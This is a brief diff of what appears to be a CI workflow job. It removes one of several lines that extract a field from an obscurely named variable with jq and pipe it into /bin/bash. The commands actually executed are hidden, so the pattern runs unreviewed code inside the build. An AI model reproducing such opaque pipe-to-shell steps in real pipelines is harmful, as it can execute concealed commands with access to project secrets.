@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$qlec186" | jq -r .kkk91601 | /bin/bash
           echo $byv3 | jq -r .wur889 | /bin/bash
           echo $x7 | jq -r .fu50 | /bin/bash
-          echo $c3583 | jq -r .ui836 | /bin/bash
           echo $ug61 | jq -r .kq1142 | /bin/bash
 
       - name: Save results
